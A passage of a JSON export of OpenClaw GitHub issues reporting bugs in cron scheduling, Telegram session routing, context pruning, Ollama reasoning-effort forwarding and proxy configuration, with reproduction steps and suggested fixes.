      "body": "# Cron Scheduler Fails to Execute Jobs Despite Gateway Running\n\n## Summary\n\nOpenClaw's internal cron scheduler is advancing `nextRunAtMs` timestamps without actually executing scheduled jobs. Multiple jobs scheduled for specific times (9:00 AM PT, 4:00 AM PT) failed to fire despite the gateway being operational and stable at the scheduled times.\n\n## Environment\n\n- **OpenClaw Version:** 2026.2.3-1 (d84eb46)\n- **Platform:** Linux (AWS EC2, Ubuntu)\n- **Gateway Mode:** local\n- **Runtime:** Node.js\n\n## Affected Jobs\n\nAll scheduled jobs affected:\n\n1. **Morning Market Briefing** \n   - Schedule: `cron: \"0 9 * * 1-5\", tz: \"America/Los_Angeles\"`\n   - Expected: 9:00 AM PT (17:00 UTC) Mon-Fri\n   - Status: **Never executed** (zero run records)\n\n2. **Memory Archival**\n   - Schedule: `cron: \"0 4 * * *\", tz: \"America/Los_Angeles\"`\n   - Expected: 4:00 AM PT (12:00 UTC) daily\n   - Status: **Never executed** (zero run records)\n\n3. Other cron jobs similarly affected (Daily Status Report, etc.)\n\n## Observed Behavior\n\n### Gateway Status\n```\nGateway started: 2026-02-10 09:50:23 UTC (01:50 AM PT)\nGateway stable and running at job execution times\nNo crashes or restarts during scheduled execution windows\n```\n\n### Job Status\n```json\n{\n  \"id\": \"dd8b8028-d589-4870-9627-823e485e6f26\",\n  \"name\": \"Morning Market Briefing\",\n  \"enabled\": true,\n  \"schedule\": {\n    \"kind\": \"cron\",\n    \"expr\": \"0 9 * * 1-5\",\n    \"tz\": \"America/Los_Angeles\"\n  },\n  \"state\": {\n    \"nextRunAtMs\": 1770829200000  // Advanced to next day without executing\n  }\n}\n```\n\n### Execution Records\n```bash\n$ openclaw cron runs dd8b8028-d589-4870-9627-823e485e6f26\n# Result: { \"entries\": [] }\n# Zero execution records despite job being \"due\" at 17:00 UTC\n```\n\n### Manual Trigger Attempt\n```bash\n$ openclaw cron run dd8b8028-d589-4870-9627-823e485e6f26\n# Result: { \"ok\": true, \"ran\": false, \"reason\": \"not-due\" }\n# Scheduler already advanced to next run without executing\n```\n\n## Expected Behavior\n\nWhen a cron job's scheduled time arrives:\n1. Scheduler should detect the job is \"due\"\n2. Execute the job (spawn isolated session, run agentTurn)\n3. Record execution in run history\n4. Advance `nextRunAtMs` to next occurrence\n\n## Actual Behavior\n\n1. Scheduler detects job is \"due\" (presumably)\n2. **No execution occurs**\n3. **No run record created**\n4. `nextRunAtMs` advances to next scheduled time anyway\n\nJobs are silently skipped.\n\n## Reproduction Steps\n\n1. Create a cron job with timezone-specific schedule:\n   ```bash\n   openclaw cron add \\\n     --cron \"0 9 * * 1-5\" \\\n     --tz \"America/Los_Angeles\" \\\n     --isolated \\\n     --announce \\\n     --channel <channel-id> \\\n     \"Test cron job message\"\n   ```\n\n2. Ensure gateway is running and stable before scheduled time\n\n3. Wait for scheduled execution time to pass\n\n4. Check run history:\n   ```bash\n   openclaw cron runs <job-id>\n   ```\n\n5. Observe: No execution records, `nextRunAtMs` advanced\n\n## Logs\n\nNo errors in gateway logs during scheduled execution windows:\n\n```bash\n$ journalctl -u openclaw-gateway --since \"17:00\" --until \"17:05\"\n# (No cron-related errors or warnings)\n```\n\nGateway logs show normal operation with Slack messages being processed, but no cron execution activity.\n\n## Workaround\n\nUsing Linux system cron to trigger OpenClaw jobs via CLI:\n\n```bash\n# System crontab\n0 17 * * 1-5 /usr/bin/openclaw cron run --force --token <token> <job-id>\n```\n\nThis works reliably, confirming:\n- Jobs execute properly when manually triggered\n- CLI trigger mechanism (`cron run --force`) functions correctly\n- Issue is isolated to the scheduler's detection/execution logic\n\n## Impact\n\n**Severity: High**\n\n- Scheduled automation completely non-functional\n- Silent failures (no errors logged)\n- Production deployments cannot rely on cron jobs\n- Requires system cron fallback, defeating purpose of integrated scheduler\n\n## Additional Context\n\n- Wake events (`openclaw cron wake --mode now`) also failed to trigger pending jobs\n- Gateway was stable (no crash-looping) during affected timeframes\n- Previous gateway restart occurred at 09:50 UTC, well before 17:00 UTC scheduled time\n- Timezone calculation appears correct (`nextRunAtMs` values are accurate)\n- Issue affects both `cron` schedule type and potentially `every` type (not fully verified)\n\n## System Info\n\n```bash\n$ openclaw --version\n2026.2.3-1 (d84eb46)\n\n$ uname -a\nLinux ip-172-31-14-234 6.8.0-1044-aws x86_64 GNU/Linux\n\n$ node --version\nv22.22.0\n```\n\n## Questions for Maintainers\n\n1. Does the scheduler actively poll for due jobs, or rely on wake events?\n2. Are timezone-aware schedules (`tz: \"America/Los_Angeles\"`) fully supported?\n3. Is there a known issue with the scheduler in `gateway.mode: \"local\"`?\n4. Should we expect logs/warnings when jobs fail to execute?\n\n---\n\n**Note:** I can provide full gateway logs, config, and additional diagnostics if helpful.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13582",
      "createdAt": "2026-02-10T18:45:17Z",
      "updatedAt": "2026-02-10T18:45:53Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "windows",
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3880044346,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13582#issuecomment-3880044346",
          "createdAt": "2026-02-10T18:45:53Z",
          "updatedAt": "2026-02-10T18:45:53Z",
          "author": "trevorgordon981",
          "body": "## Additional Deployment Context\n\nThis issue is occurring on a **production AWS EC2 deployment** (not local development).\n\n**Deployment details:**\n- EC2 instance running OpenClaw gateway as a systemd service\n- Gateway configured with Slack channel integration\n- Multiple scheduled jobs for production automation (market briefings, memory archival, status reports)\n- All jobs consistently fail to fire when scheduled\n\n**Impact clarification:** \nThis breaks production automation workflows. When running OpenClaw on AWS infrastructure, the integrated cron scheduler is completely non-functional, forcing reliance on Linux system cron as a workaround.\n\n**Workaround confirmed working:**\nSystem cron triggering `openclaw cron run --force` via CLI successfully executes jobs, confirming the execution path works but the scheduler's detection/triggering logic fails in this environment."
        }
      ]
    },
    {
      "number": 13581,
      "title": "Cron scheduler fails to execute jobs despite gateway running",
      "body": "# Cron Scheduler Fails to Execute Jobs Despite Gateway Running\n\n## Summary\n\nOpenClaw's internal cron scheduler is advancing `nextRunAtMs` timestamps without actually executing scheduled jobs. Multiple jobs scheduled for specific times (9:00 AM PT, 4:00 AM PT) failed to fire despite the gateway being operational and stable at the scheduled times.\n\n## Environment\n\n- **OpenClaw Version:** 2026.2.3-1 (d84eb46)\n- **Platform:** Linux (AWS EC2, Ubuntu)\n- **Gateway Mode:** local\n- **Runtime:** Node.js\n\n## Affected Jobs\n\nAll scheduled jobs affected:\n\n1. **Morning Market Briefing** \n   - Schedule: `cron: \"0 9 * * 1-5\", tz: \"America/Los_Angeles\"`\n   - Expected: 9:00 AM PT (17:00 UTC) Mon-Fri\n   - Status: **Never executed** (zero run records)\n\n2. **Memory Archival**\n   - Schedule: `cron: \"0 4 * * *\", tz: \"America/Los_Angeles\"`\n   - Expected: 4:00 AM PT (12:00 UTC) daily\n   - Status: **Never executed** (zero run records)\n\n3. Other cron jobs similarly affected (Daily Status Report, etc.)\n\n## Observed Behavior\n\n### Gateway Status\n```\nGateway started: 2026-02-10 09:50:23 UTC (01:50 AM PT)\nGateway stable and running at job execution times\nNo crashes or restarts during scheduled execution windows\n```\n\n### Job Status\n```json\n{\n  \"id\": \"dd8b8028-d589-4870-9627-823e485e6f26\",\n  \"name\": \"Morning Market Briefing\",\n  \"enabled\": true,\n  \"schedule\": {\n    \"kind\": \"cron\",\n    \"expr\": \"0 9 * * 1-5\",\n    \"tz\": \"America/Los_Angeles\"\n  },\n  \"state\": {\n    \"nextRunAtMs\": 1770829200000  // Advanced to next day without executing\n  }\n}\n```\n\n### Execution Records\n```bash\n$ openclaw cron runs dd8b8028-d589-4870-9627-823e485e6f26\n# Result: { \"entries\": [] }\n# Zero execution records despite job being \"due\" at 17:00 UTC\n```\n\n### Manual Trigger Attempt\n```bash\n$ openclaw cron run dd8b8028-d589-4870-9627-823e485e6f26\n# Result: { \"ok\": true, \"ran\": false, \"reason\": \"not-due\" }\n# Scheduler already advanced to next run without executing\n```\n\n## Expected Behavior\n\nWhen a cron job's scheduled time arrives:\n1. Scheduler should detect the job is \"due\"\n2. Execute the job (spawn isolated session, run agentTurn)\n3. Record execution in run history\n4. Advance `nextRunAtMs` to next occurrence\n\n## Actual Behavior\n\n1. Scheduler detects job is \"due\" (presumably)\n2. **No execution occurs**\n3. **No run record created**\n4. `nextRunAtMs` advances to next scheduled time anyway\n\nJobs are silently skipped.\n\n## Reproduction Steps\n\n1. Create a cron job with timezone-specific schedule:\n   ```bash\n   openclaw cron add \\\n     --cron \"0 9 * * 1-5\" \\\n     --tz \"America/Los_Angeles\" \\\n     --isolated \\\n     --announce \\\n     --channel <channel-id> \\\n     \"Test cron job message\"\n   ```\n\n2. Ensure gateway is running and stable before scheduled time\n\n3. Wait for scheduled execution time to pass\n\n4. Check run history:\n   ```bash\n   openclaw cron runs <job-id>\n   ```\n\n5. Observe: No execution records, `nextRunAtMs` advanced\n\n## Logs\n\nNo errors in gateway logs during scheduled execution windows:\n\n```bash\n$ journalctl -u openclaw-gateway --since \"17:00\" --until \"17:05\"\n# (No cron-related errors or warnings)\n```\n\nGateway logs show normal operation with Slack messages being processed, but no cron execution activity.\n\n## Workaround\n\nUsing Linux system cron to trigger OpenClaw jobs via CLI:\n\n```bash\n# System crontab\n0 17 * * 1-5 /usr/bin/openclaw cron run --force --token <token> <job-id>\n```\n\nThis works reliably, confirming:\n- Jobs execute properly when manually triggered\n- CLI trigger mechanism (`cron run --force`) functions correctly\n- Issue is isolated to the scheduler's detection/execution logic\n\n## Impact\n\n**Severity: High**\n\n- Scheduled automation completely non-functional\n- Silent failures (no errors logged)\n- Production deployments cannot rely on cron jobs\n- Requires system cron fallback, defeating purpose of integrated scheduler\n\n## Additional Context\n\n- Wake events (`openclaw cron wake --mode now`) also failed to trigger pending jobs\n- Gateway was stable (no crash-looping) during affected timeframes\n- Previous gateway restart occurred at 09:50 UTC, well before 17:00 UTC scheduled time\n- Timezone calculation appears correct (`nextRunAtMs` values are accurate)\n- Issue affects both `cron` schedule type and potentially `every` type (not fully verified)\n\n## System Info\n\n```bash\n$ openclaw --version\n2026.2.3-1 (d84eb46)\n\n$ uname -a\nLinux ip-172-31-14-234 6.8.0-1044-aws x86_64 GNU/Linux\n\n$ node --version\nv22.22.0\n```\n\n## Questions for Maintainers\n\n1. Does the scheduler actively poll for due jobs, or rely on wake events?\n2. Are timezone-aware schedules (`tz: \"America/Los_Angeles\"`) fully supported?\n3. Is there a known issue with the scheduler in `gateway.mode: \"local\"`?\n4. Should we expect logs/warnings when jobs fail to execute?\n\n---\n\n**Note:** I can provide full gateway logs, config, and additional diagnostics if helpful.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13581",
      "createdAt": "2026-02-10T18:44:59Z",
      "updatedAt": "2026-02-10T18:44:59Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "windows",
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13559,
      "title": "updateLastRoute overwrites webchat session deliveryContext on every Telegram DM",
      "body": "## Bug Description\n\nWhen `session.dmScope` is set to `per-channel-peer`, every Telegram DM still calls `updateLastRoute` on `agent:main:main` (the webchat/dashboard session), overwriting its `deliveryContext` from webchat to telegram. This causes webchat responses to be routed to Telegram instead of back to the browser.\n\n## Steps to Reproduce\n\n1. Configure OpenClaw with Telegram + webchat enabled, `session.dmScope: \"per-channel-peer\"`\n2. Send a message via the webchat/dashboard UI — creates `agent:main:main` session with webchat delivery context\n3. Send a Telegram DM — the Telegram handler calls `recordInboundSession()` with `updateLastRoute` targeting `route.mainSessionKey` (`agent:main:main`)\n4. The `agent:main:main` session's `deliveryContext` is now `{ channel: \"telegram\", to: \"<chatId>\" }`\n5. Next webchat response or heartbeat delivery reads the corrupted `deliveryContext` and routes to Telegram\n\n## Expected Behavior\n\nWhen `dmScope` is `per-channel-peer`, Telegram DMs already get their own session key (`agent:main:telegram:direct:<chatId>`). The `updateLastRoute` call should NOT overwrite `agent:main:main`'s `deliveryContext`, since the DM conversation is isolated by design.\n\n## Root Cause (from source analysis)\n\nIn `reply-DptDUVRg.js` (~line 36731), `recordInboundSession()` is called with:\n\n```javascript\nupdateLastRoute: !isGroup ? {\n    sessionKey: route.mainSessionKey,  // Always \"agent:main:main\"\n    channel: \"telegram\",\n    to: String(chatId),\n    ...\n} : void 0\n```\n\n`route.mainSessionKey` is computed in `resolveAgentRoute()` (~line 18346) and always resolves to `agent:main:main` regardless of `dmScope`.\n\nThe `updateLastRoute` function in `sandbox-DiYTfhXZ.js` (~line 2505) then unconditionally overwrites the `deliveryContext` on the target session.\n\n## Self-Reinforcing Corruption\n\nOnce corrupted, the issue is self-reinforcing:\n- Heartbeat reads `deliveryContext` from `agent:main:main` → delivers to Telegram\n- `initSessionState()` (~line 64596) falls back to `baseEntry?.lastChannel` when `ctx.OriginatingChannel` is unset (heartbeat/cron contexts), preserving the corruption\n\n## Suggested Fix\n\nWhen `dmScope` is not `\"main\"` (i.e., DMs have their own sessions), skip the `updateLastRoute` write to `mainSessionKey`. Alternatively, store \"last route\" metadata separately from the webchat session entry.\n\n## Workaround\n\nWe worked around this by:\n1. Setting explicit `heartbeat.target: \"telegram\"` + `heartbeat.session: \"heartbeat\"` to isolate heartbeat from the webchat session\n2. Running a monitoring script that detects and auto-fixes the corrupted `deliveryContext`\n\n## Environment\n\n- OpenClaw version: 2026.2.9 (33c75cb)\n- Node.js: v22\n- Channels: Telegram (polling) + webchat + Discord\n- Session config: `dmScope: \"per-channel-peer\"`",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13559",
      "createdAt": "2026-02-10T18:10:50Z",
      "updatedAt": "2026-02-10T18:41:54Z",
      "author": "gmuniz21",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "discord"
        ],
        "platforms": [],
        "components": [
          "web-ui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3880027975,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13559#issuecomment-3880027975",
          "createdAt": "2026-02-10T18:41:54Z",
          "updatedAt": "2026-02-10T18:41:54Z",
          "author": "lailoo",
          "body": "I addressed this issue in PR #13580\nIf you have some time, I'd really appreciate it if you could take a look.\n---\n**Fix:** Gate `updateLastRoute` on `baseSessionKey === route.mainSessionKey` so Telegram DMs with isolated sessions (`dmScope: \"per-channel-peer\"` etc.) no longer overwrite the main session's `deliveryContext`.\n"
        }
      ]
    },
    {
      "number": 13573,
      "title": "heartbeat: skip poll when session already busy",
      "body": "Heartbeat polling can collide with long embedded Pi runs and cause lock contention and Agent failed errors. Skip heartbeat polling when the session already has an active embedded Pi run by checking for active runs before the poll.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13573",
      "createdAt": "2026-02-10T18:28:24Z",
      "updatedAt": "2026-02-10T18:34:01Z",
      "author": "1kuna",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13570,
      "title": "context-pruning: forcePruneRatio to bypass TTL at high usage",
      "body": "In long sessions, cache TTL keeps tool results even when the context window is nearly full. Add optional contextPruning.forcePruneRatio so pruning can bypass the TTL when estimated context usage meets the threshold. Update schema and add a test for TTL bypass.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13570",
      "createdAt": "2026-02-10T18:27:44Z",
      "updatedAt": "2026-02-10T18:33:56Z",
      "author": "1kuna",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13519,
      "title": "Thinking blocks accumulate in context and are never pruned by cache-ttl strategy",
      "body": "Reasoning models with extended thinking keep large thinking blocks in history, and cache-ttl pruning never removes them, so old thinking consumes context.\n\nAdd contextPruning.stripThinking to remove thinking blocks outside keepLastAssistants while keeping the recent tail intact.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13519",
      "createdAt": "2026-02-10T16:38:23Z",
      "updatedAt": "2026-02-10T18:33:52Z",
      "author": "1kuna",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13575,
      "title": "[Bug]: reasoning.effort not forwarded to Ollama — only minimal thinking despite thinking=high",
      "body": "OpenClaw logs show `thinking=high` for embedded runs, but the `reasoning.effort` parameter is not being forwarded to Ollama's `/v1/responses` API. The model produces only minimal thinking (1 sentence, ~30 tokens) instead of deep chain-of-thought reasoning (200+ tokens). Direct API calls to the same Ollama endpoint with `\"reasoning\": {\"effort\": \"high\"}` produce full reasoning output.\n\n## Environment\n\n- **OpenClaw version:** 2026.2.9\n- **Ollama version:** 0.15.6\n- **Model:** `glm-4.7-flash-thinking` (custom Modelfile with `$.IsThinkSet`/`$.Think` template, based on `glm-4.7-flash:latest`)\n- **API mode:** `openai-responses`\n- **Channel:** Nextcloud Talk\n- **OS:** Ubuntu 24.04 (VM)\n\n## Config (relevant parts)\n\n```json\n{\n  \"models\": {\n    \"providers\": {\n      \"ollama\": {\n        \"baseUrl\": \"http://ollama.internal:11434/v1\",\n        \"api\": \"openai-responses\",\n        \"models\": [{\n          \"id\": \"glm-4.7-flash-thinking\",\n          \"reasoning\": true,\n          \"contextWindow\": 128000\n        }]\n      }\n    }\n  },\n  \"agents\": {\n    \"defaults\": {\n      \"model\": { \"primary\": \"ollama/glm-4.7-flash-thinking\" },\n      \"thinkingDefault\": \"high\"\n    }\n  }\n}\n```\n\n## Steps to Reproduce\n\n1. Configure Ollama provider with `\"api\": \"openai-responses\"` and a reasoning-capable model\n2. Set `agents.defaults.thinkingDefault` to `high`\n3. Set `reasoning: true` on the model entry\n4. Send a message via Nextcloud Talk (or any channel)\n5. Observe run duration and session history\n\n## Expected Behavior\n\nRuns should take 2-10 seconds with detailed chain-of-thought reasoning (200+ tokens). The `reasoning.effort: \"high\"` parameter should be included in the HTTP request to Ollama's `/v1/responses` endpoint.\n\n## Actual Behavior\n\nGateway logs show `thinking=high`, but runs complete in ~400ms with only minimal thinking output.\n\n**Gateway logs:**\n```\nembedded run start: model=glm-4.7-flash-thinking thinking=high messageChannel=nextcloud-talk\nembedded run done: durationMs=402 aborted=false\n```\n\n**Session history shows minimal thinking (1 sentence instead of detailed reasoning):**\n```json\n{\n  \"type\": \"thinking\",\n  \"thinking\": \"Manuel fragt nach 9 mal 20. Das ist 180. Ich antworte kurz auf Deutsch.\"\n}\n// usage: {\"input\": 9429, \"output\": 39}\n```\n\nThis minimal thinking comes from the model's `<think>` template tags, not from the `reasoning.effort` API parameter. The effort level is not reaching Ollama.\n\n## Proof: Ollama works correctly when called directly\n\n### /v1/responses (same endpoint OpenClaw uses)\n\n```bash\ncurl http://ollama.internal:11434/v1/responses -d '{\n  \"model\": \"glm-4.7-flash-thinking\",\n  \"input\": \"Was ist 15 * 37?\",\n  \"reasoning\": {\"effort\": \"high\"},\n  \"stream\": false\n}'\n# Result: 313 tokens (290 reasoning, multi-step with verification), 2.0 seconds\n```\n\n### /v1/chat/completions\n\n```bash\ncurl http://ollama.internal:11434/v1/chat/completions -d '{\n  \"model\": \"glm-4.7-flash-thinking\",\n  \"messages\": [{\"role\": \"user\", \"content\": \"Was ist 15 * 37?\"}],\n  \"stream\": false\n}'\n# Result: reasoning field with 289 tokens, 1.86 seconds\n```\n\nBoth Ollama API endpoints produce detailed reasoning output when called directly. The `reasoning.effort` parameter is not reaching Ollama through OpenClaw.\n\n## Comparison\n\n| Source | Thinking | Output tokens | Duration |\n|--------|----------|---------------|----------|\n| Ollama direct (effort: high) | Detailed, 3 methods, verification | 290+ | 2-10s |\n| OpenClaw (thinking=high) | 1 sentence, no detail | ~30 | ~400ms |\n\n## Root Cause Analysis\n\nThe `reasoning.effort` parameter is not being included in the HTTP request body sent to Ollama, despite being configured and tracked internally by OpenClaw.\n\n### The call chain and where it breaks\n\n1. `thinkingDefault: \"high\"` → stored in `sessionEntry.thinkingLevel`\n2. `mapThinkingLevel()` in `src/agents/pi-embedded-runner/utils.ts` passes \"high\" through\n3. `Agent._runLoop()` in `packages/agent/src/agent.ts` sets `reasoning: \"high\"` in AgentLoopConfig\n4. `streamSimpleOpenAIResponses()` in `packages/ai/src/providers/openai-responses.ts` should map to `reasoningEffort: \"high\"` — **likely broken here**?\n5. `buildParams()` in the same file gates on `model.reasoning` AND `options.reasoningEffort`:\n   ```typescript\n   if (model.reasoning) {\n       if (options?.reasoningEffort || options?.reasoningSummary) {\n           params.reasoning = {\n               effort: options?.reasoningEffort || \"medium\",\n           };\n       }\n   }\n   ```\n\nSince we observe *some* thinking (from template `<think>` tags), `model.reasoning` is likely `true` (set via user config). But `options.reasoningEffort` appears to be `undefined` when it reaches `buildParams()`, so the inner if-block is never entered and `params.reasoning` is never added to the request.\n\n### Two possible locations for the mapping failure\n\n**Location A: `src/agents/pi-embedded-runner/model.ts` (~line 180)**\n\nThe fallback model construction for Ollama models not in the built-in catalog hardcodes `reasoning: false`:\n\n```typescript\nconst fallbackModel: Model<Api> = normalizeModelCompat({\n  reasoning: false,  // ← ignores user config\n});\n```\n\nIf the fallback path is used instead of the inline provider path, this blocks the entire reasoning block in `buildParams()`. However, the minimal thinking we observe suggests the inline path IS being used and `model.reasoning` is `true`.\n\n**Location B: Thinking-to-effort mapping (between steps 3-4)**\n\nEven with `model.reasoning: true`, the mapping from OpenClaw's internal `thinkingLevel: \"high\"` to the Responses API's `reasoningEffort: \"high\"` may be broken for Ollama/custom providers. The `reasoningEffort` value arrives as `undefined` at `buildParams()`, so the effort parameter is never serialized into the HTTP request.\n\n### Secondary gate: `src/agents/model-selection.ts`\n\n`resolveThinkingDefault()` checks `candidate?.reasoning` from the **model catalog**, not from the inline provider config. For unknown Ollama models this defaults to `\"off\"`, which is why `agents.defaults.thinkingDefault: \"high\"` is also needed in the config.\n\n## Suggested Fix\n\nIn `src/agents/pi-embedded-runner/model.ts`, the generic fallback in `resolveModel()` should propagate all inline provider config properties instead of hardcoding defaults:\n\n```diff\n+const matchedModel = (providerCfg?.models ?? []).find(m => m.id === modelId);\n+\n const fallbackModel: Model<Api> = normalizeModelCompat({\n   id: modelId,\n   name: modelId,\n   api: providerCfg?.api ?? \"openai-responses\",\n   provider,\n   baseUrl: providerCfg?.baseUrl,\n-  reasoning: false,\n+  reasoning: matchedModel?.reasoning ?? false,\n-  input: [\"text\"],\n+  input: matchedModel?.input ?? [\"text\"],\n-  cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },\n+  cost: matchedModel?.cost ?? { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },\n-  contextWindow: providerCfg?.models?.[0]?.contextWindow ?? DEFAULT_CONTEXT_TOKENS,\n+  contextWindow: matchedModel?.contextWindow ?? DEFAULT_CONTEXT_TOKENS,\n-  maxTokens: providerCfg?.models?.[0]?.maxTokens ?? DEFAULT_CONTEXT_TOKENS,\n+  maxTokens: matchedModel?.maxTokens ?? DEFAULT_CONTEXT_TOKENS,\n } as Model<Api>);\n```\n\nThis ensures that user-configured model properties (especially `reasoning: true`) are respected in the fallback path, instead of being silently overridden.\n\n### Why the inline match at step 2 may fail\n\nThe inline model match in `resolveModel()` uses a strict comparison:\n\n```typescript\nconst inlineMatch = inlineModels.find(\n  (entry) => normalizeProviderId(entry.provider) === normalizedProvider && entry.id === modelId,\n);\n```\n\nIf provider normalization causes a mismatch (e.g., `\"ollama\"` vs `\"Ollama\"` or prefix handling), step 2 fails silently and the fallback at step 5 fires with `reasoning: false`. The suggested fix catches this case by looking up the model properties directly from `providerCfg.models`.\n\n## Possibly related issues\n\n- #4028 (num_ctx not passed via OpenAI-compatible API — same pattern of provider config being ignored in fallback)\n- #8505 / #2279 (Ollama models return no output)\n- Discussion #4332 (think value \"low\" not supported)\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13575",
      "createdAt": "2026-02-10T18:29:35Z",
      "updatedAt": "2026-02-10T18:29:35Z",
      "author": "manuelcherubim",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13566,
      "title": "Telegram DM: lastThreadId cached from incoming messages causes reply delivery failures",
      "body": "## Description\n\nTelegram DM replies intermittently fail to deliver because OpenClaw caches `lastThreadId` from incoming messages in the session store, then includes `message_thread_id` when sending replies. Telegram rejects these with \"message thread not found\".\n\n## Context\n\n- This is a **1:1 DM** with a bot (not a group/forum)\n- The bot chat does NOT have Topics enabled (it's a regular DM — no option to enable/disable Topics)\n- Yet incoming messages from Telegram carry a `message_thread_id` field\n- OpenClaw caches this as `lastThreadId` in `sessions.json`\n- Subsequent replies include `message_thread_id` → Telegram API rejects them\n\n## Relation to #11620\n\nThe fix in #11620 (\"recover proactive sends when stale topic thread IDs are used by retrying without message_thread_id\") only covers **proactive sends** (cron announces, sub-agent results). It does NOT cover **normal session replies** in the main DM session.\n\n## Steps to Reproduce\n\n1. Set up a Telegram bot DM\n2. Send messages — observe `lastThreadId` appearing in `sessions.json` under the main session\n3. Some replies will fail to deliver to Telegram (visible in OpenClaw web dashboard but never arrive in Telegram)\n4. Manually deleting `lastThreadId` from sessions.json + gateway restart temporarily fixes it, but it gets re-cached from the next incoming message\n\n## Observed Session Store\n\n```json\n{\n  \"agent:main:main\": {\n    \"lastThreadId\": 1651,\n    \"lastTo\": \"telegram:911251122\",\n    \"lastChannel\": \"telegram\"\n  }\n}\n```\n\n## Expected Behavior\n\n- For 1:1 bot DMs, `message_thread_id` from incoming messages should NOT be cached/used for replies\n- OR the retry-without-threadId logic from #11620 should also apply to regular session replies, not just proactive sends\n\n## Environment\n\n- OpenClaw: 2026.2.9\n- Telegram Bot API\n- Chat type: private (1:1 DM with bot)\n\n## Workaround\n\nManually delete `lastThreadId` from sessions.json and restart gateway. But it gets re-cached from the next incoming message.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13566",
      "createdAt": "2026-02-10T18:21:02Z",
      "updatedAt": "2026-02-10T18:27:07Z",
      "author": "adpablos",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3879959166,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13566#issuecomment-3879959166",
          "createdAt": "2026-02-10T18:27:07Z",
          "updatedAt": "2026-02-10T18:27:07Z",
          "author": "adpablos",
          "body": "**Update:** Confirmed that cleaning `lastThreadId` from sessions.json is NOT a viable workaround. \n\nAfter deleting `lastThreadId` and restarting the gateway, the very next incoming Telegram DM message re-caches the `message_thread_id`, restoring the stale value immediately.\n\n**Additional observation:** Of two consecutive replies sent in the same turn, the longer one (with markdown, bullet points, links) was delivered to Telegram successfully, while the shorter follow-up was NOT delivered. The behavior is intermittent within the same session, which suggests the retry logic from #11620 may be firing for some sends but not others.\n\n**Conclusion:** This needs a code-level fix — either:\n1. Never cache/use `message_thread_id` for private/DM chats (where Topics don't exist)\n2. Apply the retry-without-threadId logic from #11620 to ALL Telegram sends, not just proactive ones"
        }
      ]
    },
    {
      "number": 13567,
      "title": "[Telegram] Missing proxy documentation + polling bug",
      "body": "## Telegram Proxy Configuration - Missing Documentation and Polling Bug\n\n### Problem Description\n\nFor users in regions where Telegram is blocked (e.g., China), configuring OpenClaw to work with Telegram requires proxy support, but the documentation is incomplete.\n\n### Issues Found\n\n#### 1. Documentation Missing: Proxy Configuration\n\nThe Telegram channel documentation does not clearly explain how to configure proxy settings. Users need to add:\n\n```json\n{\n  \"channels\": {\n    \"telegram\": {\n      \"enabled\": true,\n      \"botToken\": \"YOUR_BOT_TOKEN\",\n      \"proxy\": \"http://127.0.0.1:7897\"\n    }\n  }\n}\n```\n\n#### 2. Documentation Missing: Routing Rules\n\nWithout explicit routing rules, Telegram messages default to the `webchat` channel instead of `telegram`. Users need to add:\n\n```json\n{\n  \"routing\": {\n    \"rules\": [\n      {\n        \"channel\": \"telegram\",\n        \"session\": \"main\"\n      }\n    ]\n  }\n}\n```\n\n#### 3. Code Bug: Polling Does Not Use Proxy\n\nEven with `proxy` configured, receiving messages (polling) does not work while sending messages works. This is because `createTelegramRunnerOptions` in `src/telegram/monitor.ts` does not pass `proxyFetch` to the runner's fetch configuration.\n\n**Root Cause:**\n```typescript\n// src/telegram/monitor.ts - Line ~178\nconst runner = run(bot, createTelegramRunnerOptions(cfg));  // proxyFetch not passed!\n```\n\n**Solution (Working):**\n```typescript\nexport function createTelegramRunnerOptions(\n  cfg: OpenClawConfig,\n  proxyFetch?: typeof fetch,  // Add parameter\n): RunOptions<unknown> {\n  return {\n    runner: {\n      fetch: {\n        timeout: 30,\n        allowed_updates: resolveTelegramAllowedUpdates(),\n        ...(proxyFetch ? { fetch: proxyFetch } : {}),  // Use it\n      },\n    },\n  };\n}\n\n// Usage:\nconst runner = run(bot, createTelegramRunnerOptions(cfg, proxyFetch));\n```\n\n### Suggested Documentation Improvements\n\n1. Add proxy configuration section in Telegram channel docs\n2. Add routing configuration section for multi-channel setups\n3. Document the polling bug (until fixed in code)\n\n### Environment\n- OpenClaw: v2026.2.9\n- Node.js: v22.22.0\n- OS: Linux",
      "state": "open",
      "comments": 0,
